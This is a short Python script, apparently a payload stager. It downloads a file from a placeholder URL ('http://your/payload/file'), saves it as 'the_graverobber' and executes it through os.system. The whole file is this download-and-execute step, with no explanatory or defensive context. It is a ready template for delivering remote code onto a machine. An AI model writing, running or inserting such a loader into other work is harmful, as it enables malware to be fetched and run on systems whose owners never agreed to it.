import requests
import os

data = requests.get("http://your/payload/file")
with open("the_graverobber", "wb") as fl:
    fl.write(data.content)

os.system("./the_graverobber")
